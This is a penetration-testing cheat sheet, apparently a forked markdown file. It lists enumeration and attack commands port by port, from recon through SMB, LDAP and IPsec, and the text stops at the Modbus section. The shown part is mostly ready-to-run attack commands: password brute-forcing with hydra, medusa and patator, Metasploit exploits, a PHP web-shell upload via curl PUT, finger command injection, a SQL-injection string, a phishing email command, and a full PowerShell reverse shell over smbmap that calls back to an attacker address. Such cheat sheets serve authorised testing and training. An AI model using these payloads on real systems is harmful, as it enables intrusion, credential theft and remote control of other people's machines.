# UltraEnum Port Listing
## Table of Contents
<!-- TOC -->
- [UltraEnum Port Listing](#ultraenum-port-listing)
  - [Table of Contents](#table-of-contents)
  - [Preface](#preface)
  - [TODO List](#todo-list)
- [Recon](#recon)
    - [Port Knocking](#port-knocking)
    - [Port 7 - Echo tcp/udp](#port-7---echo-tcpudp)
    - [Port 21 - FTP](#port-21---ftp)
    - [Port 22 - SSH](#port-22---ssh)
    - [Port 23 - Telnet](#port-23---telnet)
    - [Port 25 - Simple Mail Transfer Protocol (SMTP)](#port-25---simple-mail-transfer-protocol-smtp)
    - [Port 43 - WHOIS](#port-43---whois)
    - [Port 53 - DNS](#port-53---dns)
    - [Port 69 - UDP - TFTP](#port-69---udp---tftp)
    - [Port 79 - Finger](#port-79---finger)
    - [Port 80 - Web Server (Common CMS Enumeration Techniues)](#port-80---web-server-common-cms-enumeration-techniues)
      - [WordPress](#wordpress)
      - [Joomla!](#joomla)
      - [Drupal](#drupal)
      - [Centreon](#centreon)
      - [Magento](#magento)
      - [Zabbix Monitoring Solutions](#zabbix-monitoring-solutions)
    - [Port 80 / 443 - Webdav](#port-80--443---webdav)
    - [Port 88 - Kerberos](#port-88---kerberos)
    - [Port 110 - POP3](#port-110---pop3)
    - [Port 110 / 995 - POP](#port-110--995---pop)
    - [Port 111 - Rpcbind](#port-111---rpcbind)
    - [Port 113 - Ident](#port-113---ident)
    - [Port 123 - TNP](#port-123---tnp)
    - [Port 135 - MSRPC](#port-135---msrpc)
    - [Port 139/445 - SMB](#port-139445---smb)
    - [Port 143 / 993- IMAP](#port-143--993--imap)
    - [Port 161/162 UDP - SNMP](#port-161162-udp---snmp)
    - [Port 194 / 6667 / 6660 - 7000 - IRC](#port-194--6667--6660---7000---irc)
    - [Port 264 - Check Point FireWall-1](#port-264---check-point-firewall-1)
    - [Port 389, 636, 3268, 3269 - LDAP](#port-389-636-3268-3269---ldap)
    - [Port 443 - HTTPS](#port-443---https)
    - [Port 500 - ISAKMP IPsec/IKE VPN](#port-500---isakmp-ipsecike-vpn)
    - [Port 502 - Modbus](#port-502---modbus)
    - [Port 512 - Rexec](#port-512---rexec)
    - [Port 513 - Rlogin](#port-513---rlogin)
    - [Port 514 - RSH](#port-514---rsh)
    - [Port 515 - line printerdaemon LPd](#port-515---line-printerdaemon-lpd)
    - [Port 541 - FortiNet SSLVPN](#port-541---fortinet-sslvpn)
    - [Port 548 - Apple Filing Protocol (AFP)](#port-548---apple-filing-protocol-afp)
    - [Port 554 - RTSP](#port-554---rtsp)
    - [Port 623 / UDP / TCP - IPMI](#port-623--udp--tcp---ipmi)
    - [Port 631 - Internet Printing Protocol(IPP)](#port-631---internet-printing-protocolipp)
    - [Port 873 - Rsync](#port-873---rsync)
    - [Port 1026 - Rusersd](#port-1026---rusersd)
    - [Port 1028 / 1099 - Java RMI](#port-1028--1099---java-rmi)
    - [Port 1030/1032/1033/1038](#port-1030103210331038)
    - [Port 1433 - MSSQL](#port-1433---mssql)
    - [Port 1521 - Oracle](#port-1521---oracle)
    - [Port 1723 - PPTP](#port-1723---pptp)
    - [Port 1883 - MQTT (Mosquitto)](#port-1883---mqtt-mosquitto)
    - [Port 2049 - NFS TNS Listener](#port-2049---nfs-tns-listener)
    - [Port 2100 - Oracle XML DB](#port-2100---oracle-xml-db)
    - [Port 3260 - ISCSI](#port-3260---iscsi)
    - [Port 3299 - SAPRouter](#port-3299---saprouter)
    - [Port 3306 - MySQL](#port-3306---mysql)
    - [Port 3339 - Oracle web interface](#port-3339---oracle-web-interface)
    - [Port 3389 - RDP](#port-3389---rdp)
    - [Port 3632 - distcc](#port-3632---distcc)
    - [Port 4506 - SaltStack (Salt Master)](#port-4506---saltstack-salt-master)
    - [Port 4369 - Erlang Port Mapper Daemon (epmd)](#port-4369---erlang-port-mapper-daemon-epmd)
    - [Port 5353 / UDP - Multicast DNS (mDNS)](#port-5353--udp---multicast-dns-mdns)
    - [Port 5355 UDP / TCP - Link-Local Multicast Name Resolution (LLMNR)](#port-5355-udp--tcp---link-local-multicast-name-resolution-llmnr)
    - [Port 5432 / 5433 -  Postgresql](#port-5432--5433----postgresql)
    - [Port 5671 - AMQP](#port-5671---amqp)
    - [Port 5985 / 5986 - WinRM](#port-5985--5986---winrm)
    - [Port 5800 / 5801 / 5900 / 5901 -  VNC](#port-5800--5801--5900--5901----vnc)
    - [Port 5984 - CouchDB](#port-5984---couchdb)
    - [Port 6000 - X11](#port-6000---x11)
    - [Port 6379 - Redis](#port-6379---redis)
    - [Port 8009 - Apache JServ Protocol (AJP)](#port-8009---apache-jserv-protocol-ajp)
    - [Port 8172 - MsDeploy](#port-8172---msdeploy)
    - [Port 8080 - Apache Tomcat](#port-8080---apache-tomcat)
    - [Port 8500 (TCP) - Macromedia/Adobe ColdFusion Web Server](#port-8500-tcp---macromediaadobe-coldfusion-web-server)
    - [Port 9042 / 9160 -  Cassandra](#port-9042--9160----cassandra)
    - [Port 9100 - Raw Printing (JetDirect, AppSocket, PDL-datastream)](#port-9100---raw-printing-jetdirect-appsocket-pdl-datastream)
    - [Port 9200 - Elasticsearch](#port-9200---elasticsearch)
    - [Port  10000 - Network Data Management Protocol (ndmp)](#port--10000---network-data-management-protocol-ndmp)
    - [Port 10050 - Zabbix-Agent [TCP/UDP]](#port-10050---zabbix-agent-tcpudp)
    - [Port 11211 - Memcache](#port-11211---memcache)
    - [Port 15672 - RabbitMQ Management](#port-15672---rabbitmq-management)
    - [Port 27017 / 27018 - MongoDB](#port-27017--27018---mongodb)
    - [Port 44818 / UDP / TCP - EthernetIP](#port-44818--udp--tcp---ethernetip)
    - [Port 47808 / udp - BACNet](#port-47808--udp---bacnet)
    - [Port 50030 / 50060 / 50070 / 50075 / 50090 - Hadoop](#port-50030--50060--50070--50075--50090---hadoop)
    - [Unknown ports](#unknown-ports)
- [Unsorted](#unsorted)
    - [Url Brutforce](#url-brutforce)
    - [Default_Weak login](#default_weak-login)
    - [LFI-RFI](#lfi-rfi)
    - [Sql-injection](#sql-injection)
    - [XSS](#xss)
    - [Sql-login Bypass](#sql-login-bypass)
    - [Bypass img Upload](#bypass-img-upload)
    - [Node.js](#nodejs)
    - [Online crackers](#online-crackers)

<!-- TOC -->

## Preface

> Forked by wahost070 & locass03


Please keep in mind that user variables have been represented as `$IP` or `<SOMETHING>`, fill in appropriately.

The "`>`" symbol denotes a line of user input. Any subsequent commands/input will follow on the next time. An empty line between two commands indicate they are seperate commands. 

e.g
```bash
# comments with a "#" symbol

> this_is_my_command
> more
> options

> standalone_command $IP

> another_command <USERNAME>

```

## TODO List

The standards/conventions in this document are a WIP, so please keep in mind that some conventions used at different parts may difer.

# Recon

```sh
export IP=10.10.10.11
```

```bash
# Enumerate subnet
nmap -sn 10.10.10.1/24
```

```bash
# Fast simple scan
nmap -sS 10.10.10.1/24
```

```bash
# Extracting Live IPs from Nmap Scan
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips

```

```bash
# Full complete slow scan with output
nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full $IP
```

```bash
# Scan for UDP
nmap $IP -sU
unicornscan -mU -v -I $IP
```

```bash
# Connect to UDP if one is open
nc -u $IP <PORT>

```

```bash
# Autorecon
python3 autorecon.py $IP
```

```bash
# Netcat basic versioning
nc -v $IP <PORT>

# Telnet versioning
telnet $IP <PORT>
```

```
# Responder
responder -I eth0 -A
```

```
# Amass
amass enum $IP
```

```bash
# Generating nice scan report
nmap -sV $IP -oX scan.xml && xsltproc scan.xml -o "`date +%m%d%y`_report.html"
```
```bash
#Simple Port Knocking
for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done
```

```bash
# Search nmap scripts for keywords
ls /usr/share/nmap/scripts/* | grep <KEYWORD>
```

It is generally better practice to use do the following on a penetration test:
* T4 - T5 on internal pentests, over low latency links and high bandwidth to prevent inconclusive results.
* T2 - T3 on external pentests (using an internet connection)

```bash
# Scan a subnet 
netdiscover -r 192.168.1.0/24
```

### Port Knocking

```bash
# Check for ports in /etc/knockd.conf

for knock in <PORT_A PORT_B PORT_C> ; do nmap -Pn --host-timeout 201 --max-retries 0 -p $knock $IP; done

# Using tool:
knock $IP <PORTS PORTS PORTS>
```

### Port 7 - Echo tcp/udp

```bash
# Contact Echo service (UDP)
nc -uvn $IP 7
Hello echo    #This is wat you send
Hello echo    #This is the response
```
References :
* https://en.wikipedia.org/wiki/ECHO_protocol

### Port 21 - FTP

Use a software such as FileZilla for GUI method of accessing FTP
```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP

# Banner Grabbing
telnet -vn $IP 21
```
```bash
# Anonymous login
ftp <IP>
> anonymous:anonymous # or ftp:ftp
> ls -a # List all files
> binary #Set transmission to binary instead of ascii
> ascii #Set transmission to ascii instead of binary
> bye #exit

# Browser connection
ftp://anonymous:anonymous@10.10.10.xx

```
```bash
# Download all files
wget -m ftp://anonymous:anonymous@$IP #Donwload all
wget -m --no-passive ftp://anonymous:anonymous@$IP #Download all

```

### Port 22 - SSH

```bash
# Enumeration
nc -vn $IP 22
```
```bash
# Public SSH key of server
ssh-keyscan -t rsa $IP -p <PORT>
```
```bash
#Msf
use auxiliary/fuzzers/ssh/ssh_version_2

#SSH Enum users < 7.7:

python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt $IP 2>/dev/null | grep "is a"
```
```bash
# Bruteforce methods:

hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111

patator ssh_login host=$IP port=22 user=root 0=your_file.txt password=FILE0 -x ignore:mesg='Authentication failed.'

medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh

ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111
```
```bash
# Tunneling
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>

# Accessing remote host port locally
ssh -nNT -L <LPORT>:<LOCAL_ADDR>:<RPORT> <username>@<ip_compromised>

# Forwarding local port to remote host
ssh -nNT -R <RPORT>:<REMOTE_ADR>:<LPORT> <username>@<ip_compromised>

# SSH Pivoting
sudo ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip # dynamic SOCKSv5 proxy
# Add socks5 127.0.0.1 1010 in /etc/proxychains.conf
# Disable socks4 (used for metasploit)
# Enable socks5 (used for SSH) and set port as appropriate

# Prefix commands with "proxychains", e.g 
proxychains curl -k https://10.10.10.60

```
References / Other Resources:
* https://github.com/six2dez/ssh_enum_script

* https://www.exploit-db.com/exploits/45233


### Port 23 - Telnet
```bash
# Banner Grabbing
nc -nv $IP 23

# nmap
nmap -nv -sV -Pn --script "*telnet* and safe" -p 23 $IP

# Access directly with telnet
telnet $IP 
```

### Port 25 - Simple Mail Transfer Protocol (SMTP)
```sh
# Finding MX servers of an organisation
> dig +short mx <COMPANY_DOMAIN_NAME>

# smtps
> openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587

# Enumeration
> nmap -p25 --script=smtp-commands $IP
# or use  nmap plugin smtp-ntlm-info.nse

# Enumeration using SMTP commands
> nc -nv $IP 25
> VRFY root

#Enumeration of a mailing list
> nc -nv $IP 25
> EXPN test-list

# enum users
msf > auxiliary/scanner/smtp/smtp_enum

> smtp-user-enum

> nmap –script smtp-enum-users.nse $IP

```
```bash
# Send Email from linux console
> sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s $IP -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
```

### Port 43 - WHOIS
```bash
# Enumerate
> whois -h $IP -p <PORT> "domain.tld"

> echo "domain.ltd" | nc -vn $IP <PORT>
```

Also, the WHOIS service always needs to use a database to store and extract the information.

So, a possible SQLInjection could be present when querying the database from some information provided by the user.

For example doing: `whois -h 10.10.10.155 -p 43 "a') or 1=1#"`
you could be able to extract all the information saved in the database.


### Port 53 - DNS
```bash
# nslookup
> nslookup
> SERVER <IP_DNS> #Select dns server
> 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...
> <IP_MACHINE> #Reverse lookup of a machine, maybe...

# DNS lookups, Zone Transfers & Brute-Force
whois domain.com
# OPTION = a / txt / ns / mx
dig <OPTION> domain.com
dig <OPTION> domain.com @ns1.domain.com

host -t <OPTION> site.com
host -a domain.com
host -l domain.com ns1.domain.com

dnsrecon -d <DOMAIN.COM> -t axfr @ns2.<DOMAIN.COM>
dnsrecon -d  -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
dnsenum domain.com

# DNS - Subdomains bruteforce
dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <IP_DNS>

# Dnscan tool https://github.com/rbsec/dnscan
dnscan -d <domain> -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, 

# Bruteforce with bash
for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done

```

### Port 69 - UDP - TFTP
```bash
nmap -p69 --script=tftp-enum.nse $IP # Or
nmap -n -Pn -sU -p69 -sV --script tftp-enum $IP

# Download Upload
msf5> auxiliary/admin/tftp/tftp_transfer_util

```
```python
import tftpy
client = tftpy.TftpClient(<ADDRESS>, <PORT>)
client.download("filename in server", "/tmp/filename", timeout=5)
client.upload("filename to upload", "/local/path/file", timeout=5)

```
### Port 79 - Finger
```bash
# Enumeration Banner Grabbing/Basic connection
nc -vn $IP 79
echo "root" | nc -vn $IP 79

# User enumeration
finger @$IP       #List users
finger admin@$IP  #Get info of user
finger user@$IP   #Get info of user

# msf
use auxiliary/scanner/finger/finger_users

# command execution
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"

```
### Port 80 - Web Server (Common CMS Enumeration Techniues)

Check for the following items:
* Navigate, robots.txt, sitemap.xml
* Headers
* page source Code

```bash
# Server Version (Vulnerable?)
whatweb -a 1 <URL> #Stealthy
whatweb -a 3 <URL> #Aggresive
webtech -u <URL>

# Nikto
nikto -h http://$ip

# CMS Explorer
cms-explorer -url http://$IP -type [Drupal, WordPress, Joomla, Mambo]


# Enum User:

for i in {1..50}; do curl -s -L -i https://ip.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}';done


# Get header
curl -i $IP

# Get options
curl -i -X OPTIONS $IP

# Get everything
curl -i -L $IP
curl -i -H "User-Agent:Mozilla/4.0" http://$IP:8080

# Check for title and all links
curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl $IP -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://$IP/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php

# Simple curl POST request with login data
curl -X POST http://$IP/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'

curl -s  http://$IP/fileRead.php -d 'file=fileRead.php' | jq -r ."file"


# Google Dork

site:domain.com intext:user

https://github.com/sushiwushi/bug-bounty-dorks
```

#### WordPress
```bash
# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://$IP --enumerate u
wpscan -e --url https://url.com

# Scan wordpress with random user agent, enumerate users and all plugins
wpscan -v --rua -e u,ap --url <URL>

# Same as above, but with wordlist
wpscan  -v --rua -e u,ap -P /root/Desktop/Wordlists/rockyou.txt --url <URL>

```

#### Joomla!
```bash
# Joomscan
joomscan -u  http://$IP
joomscan -u  http://$IP --enumerate-components
```

#### Drupal
```bash
# TODO
```

#### Centreon
```bash
# TODO
```

#### Magento
```bash
git clone https://github.com/steverobbins/magescan.git
./magescan.phar scan:all $IP

# TODO
```

#### Zabbix Monitoring Solutions
(Authenticated RCE via GUI Admin Panel)

- Under `Administration > Scripts`, a custom command can be set up.
- Create Script, and set as "Execute on Zabbix server" to execute the script on the server no mater where it is triggered.
- Scripts can be executed under `Monitoring > Triggers` and then selecting a host to execute the command on.

### Port 80 / 443 - Webdav
```bash
# Web Distributed Authoring and Versioning
davtest -cleanup -url http://$IP
cadaver http://$IP
```

### Port 88 - Kerberos

```bash
# user enum:
> nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" $IP

# User enum with MSF
msf> use auxiliary/gather/kerberos_enumusers

# python script
> python kerbrute.py -dc-ip $IP -users /path/to/users.txt -passwords /path/to/pass.txt -threads 20 -domain $DOMAIN -outputfile kb_extracted_passwords.txt

```
Resources:
> https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
> https://www.youtube.com/watch?v=snGeZlDQL2Q
> https://www.tarlogic.com/blog/como-funciona-kerberos/
> https://www.tarlogic.com/blog/como-atacar-kerberos/

### Port 110 - POP3

```bash
# If you have mail creds, you can try the following

# via Telnet
> telnet $IP
> USER taha@$IP # Or without the @$IP
> PASS admin

#or:

> telnet $IP
> USER admin
> PASS admin

```
### Port 110 / 995 - POP
```bash
# Banner Grabbing
> nc -nv $IP 110

> openssl s_client -connect $IP:995 -crlf -quiet

# Automated
> nmap --script="pop3-capabilities or pop3-ntlm-info" -sV -p <PORT> $IP

### POP syntax ###
#POP commands:
  USER uid           Log in as "uid"
  PASS password      Substitue "password" for your actual password
  STAT               List number of messages, total mailbox size
  LIST               List messages and sizes
  RETR n             Show message n
  DELE n             Mark message n for deletion
  RSET               Undo any changes
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          Show first n lines of message number msg
  CAPA               Get capabilities

```
> http://sunnyoasis.com/services/emailviatelnet.html

### Port 111 - Rpcbind
Check MSRPC (Port 135) as well if the port is open
```bash
# Enumeration
> rpcinfo $IP
> nmap -sSUC -p111 $IP

> rpcinfo -p <PORT> $IP
> rpcclient -U "" $IP
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```
### Port 113 - Ident
```bash
# Nmap
# By default (-sC) nmap will identify every user of every running port

```
### Port 123 - TNP
```bash
# Enumeration
> nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $IP

# using ntpq
> ntpq -c readlist $IP
> ntpq -c readvar $IP
> ntpq -c monlist $IP
> ntpq -c peers $IP
> ntpq -c listpeers $IP
> ntpq -c associations $IP
> ntpq -c sysinfo $IP

```

### Port 135 - MSRPC
Check Rpcbind (Port 111) as well if the port is open
```bash
# Enumeration
> nmap $IP --script=msrpc-enum
> nmap -n -sV -p 135 --script=msrpc-enum $IP

# Msf
msf> use exploit/windows/dcerpc/ms03_026_dcom
msf> use auxiliary/scanner/dcerpc/endpoint_mapper
msf> use auxiliary/scanner/dcerpc/hidden
msf> use auxiliary/scanner/dcerpc/management
msf> use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

# Identifying Exposed RPC Services with rpcdump.py
> rpcdump $IP -p <PORT>
IfId: 5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc version 1.0
Annotation: Messenger Service
UUID: 00000000-0000-0000-0000-000000000000
Binding: ncadg_ip_udp:192.168.189.1[1028]

# Example usage of above
> rpcdump.py $IP -p 135
```

Changing AD user credentials with rpcclient:
```bash
######## Changing AD user Password with rpcclient ########

# Changing password of an Active Directory user
> rpcclient -U <username> //$IP # must know user's original password

# Note: setuserinfo2 is not possible for anyone with AdminCount = 1 (domain admins, and other high priv accounts)
rpcclient> setuserinfo2 <username> <level> '<password>' # level is typically 23

# If "samba-common-bin" package is installed, then you can change the password with net
> net rpc password <username to change> -U <username to authenticate with> -S $IP

# SID/RID Bruteforce lookup
> impacket-lookupsid.py <USERNAME>:<PASSWORD>@$IP # Authorised bruteforce

# With CrackMapExec
> cme smb $IP -u <USERNAME> -p <PASSWORD> --rid-brute

```
References:
> https://malicious.link/post/2017/reset-ad-user-password-with-linux/

### Port 139/445 - SMB
```bash
# OS Discovery
> nmap $IP --script=smb-os-discovery

# Enum hostname
> enum4linux -n $IP

> nmblookup -A $IP

> nmap --script=smb-enum* --script-args=unsafe=1 -T5 $IP

# Get Version
> smbver.sh $IP

> Msfconsole;use scanner/smb/smb_version

> ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]'

# Get Information (NetBIOS)
> sudo nbtscan -r $IP # '-r' used to specify the default UDP port 137

# Testing null sessions in Windows
> net use \\TARGET\IPC$ "" /u:""

# Testing null sessions in Linux
> smbclient -L \\\\$IP -U "" #-N to disable password requirement

# Get Shares
> smbmap -H  $IP -R <sharename>

> echo exit | smbclient -L \\\\

> smbclient \\\\$IP\\<share>

> smbclient -L \\$IP -N

> smbclient -L \\\\$IP\\

> smbclient -L \\\\$IP\\ -U "<username>%<password>"


# nMAP Share Enumeration
> nmap --script smb-enum-shares -p139,445 -T4 -Pn $IP

> nmap -T4 -v -oN shares --script smb-enum-shares --script-args smbuser=username,

> smbpass=password -p139,445 $IP

> nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $IP #enum shares

# RID Cycling attack for bruteforcing domain controllers to enumerate user accounts
# https://github.com/trustedsec/ridenum
> apt install ridenum
> ridenum $IP 500 50000 dict.txt

> msfconsole; use auxiliary/scanner/smb/smb_lookupsid


# Check null sessions
smbmap -H $IP
rpcclient -U "" -N $IP
smbclient -L \\\\$IP\\ -U ""
smbclient //$IP/IPC$ -N

# Exploit null sessions
enum -s $IP
enum -U $IP
enum -P $IP
enum4linux -a $IP
/usr/share/doc/python3-impacket/examples/samrdump.py $IP

# Connect to username shares
smbclient //$IP/share -U username

# Connect to share anonymously
smbclient \\\\$IP\\<share>
smbclient //$IP/<share>
smbclient //$IP/<share\ name>
smbclient //$IP/<""share name"">
rpcclient -U " " $IP
rpcclient -U " " -N $IP

# Check vulns
nmap --script smb-vuln* -p139,445 -T4 -Pn $IP

# Check common security concerns
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc

# Extra validation
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc

# Multi exploits
msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost $IP; run

# Bruteforce login
medusa -h $IP -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $IP  -vvvv
nmap –script smb-brute $IP

# nmap smb enum & vuln

nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 $IP

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 $IP

# Mount smb volume linux
mount -t cifs -o username=user,password=password //$IP/share /mnt/share

# rpcclient commands
rpcclient -U "" $IP
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall

# Run cmd over smb from linux
winexe -U username //$IP "cmd.exe" --system

# smbmap commands
    #Enum
smbmap.py -H $IP -u administrator -p asdf1234
    #RCE
smbmap.py -u username -p 'P@$$w0rd1234!' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H $IP
    # Drive Listing
smbmap.py -H $IP -u username -p 'P@$$w0rd1234!' -L
    # Reverse Shell
smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H $IP -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'

# Check
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml # look for user&pass "gpp-decrypt "

# changing smb password with smbpasswd
smbpasswd -r $IP -U <username>

```
### Port 143 / 993- IMAP
```bash
# Banner grabbing
nc -nv $IP 143
openssl s_client -connect $IP:993 -quiet

# NTLM Auth - Information disclosure
-- use the nmap script imap-ntlm-info.nse

```
### Port 161/162 UDP - SNMP
```bash
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes,snmp-info $IP


snmp-check $IP -c public|private|community

snmpwalk -v 2c -c public $ip

# Making SNMP output values human readable
apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf

# username enumeration from SNMPv3
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb


```
### Port 194 / 6667 / 6660 - 7000 - IRC
```bash
# Enumeration
nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb

```

### Port 264 - Check Point FireWall-1
```bash
msf > use auxiliary/gather/checkpoint_hostname
msf > set RHOST $IP

# read
* https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#check-point-firewall-1-topology-port-264

```
### Port 389, 636, 3268, 3269 - LDAP

```bash
# Basic Enumeration
nmap -n -sV --script "ldap* and not brute" $IP #Usernames can potentially be used with Impacket/GetNPUsers

# Clear text credentials
* If LDAP is used without SSL you can sniff credentials in plain text in the network.

ldapsearch -h $IP -p 389 -x -b "dc=mywebsite,dc=com"

ldapsearch -x -h $IP -D 'DOMAIN\user' -w 'hash-password'

ldapsearch -x -h $IP -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"

ldapdomaindump $IP -u 'DOMAIN\user' -p 'hash-password'

#bruteforce

ldapsearch -x -h $IP -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
ldapsearch -x -h $IP -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"

patator ldap_login host=$IP 1=/root/Downloads/passwords_ssh.txt user=hsmith password=FILE1 -x ignore:mesg='Authentication failed.'

# GUI method
Graphical Interface
You can download a graphical interface with LDAP server here:
http://www.jxplorer.org/downloads/users.html



```

### Port 443 - HTTPS

- Read the actual SSL CERT to:
    * find out potential correct vhost to GET
    * is the clock skewed?
    * any names that could be usernames for bruteforce/guessing.

```bash
sslscan $IP:443
nmap -sV --script=ssl-heartbleed $IP
```

### Port 500 - ISAKMP IPsec/IKE VPN
```bash
# enumeration
nmap -sU -p 500

ike-scan $IP
ike-scan -M $IP

```
As you can see in the previous response, there is a field called AUTH with the value PSK.
This means that the vpn is configured using a preshared key (and this is really good for a pentester).
* The value of the last line is also very important: *

*  0 returned handshake; 0 returned notify: This means the target is not an IPsec gateway.

* 1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptable (a valid transform will be shown in the output)

* 0 returned handshake; 1 returned notify: VPN gateways respond with a notify message when none of the transforms are acceptable (though some gateways do not, in which case further analysis and a revised proposal should be tried).
 Then, in this case we already have a valid transformation but if you are in the 3rd case, then you need to brute-force a little bit to find a valid transformation:
First of all you need to create all the possible transformations:

```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
And then brute-force each one using ike-scan (this can take several minutes):
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
* Reference Material

[PSK cracking paper​](www.ernw.de/download/pskattack.pdf​)
​[SecurityFocus Infocus​](www.securityfocus.com/infocus/1821)
​[Scanning a VPN Implementation​](http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf)
### Port 502 - Modbus
```bash
# Enumeration
nmap --script modbus-discover -p 502 $IP
msf> use auxiliary/scanner/scada/modbusdetect
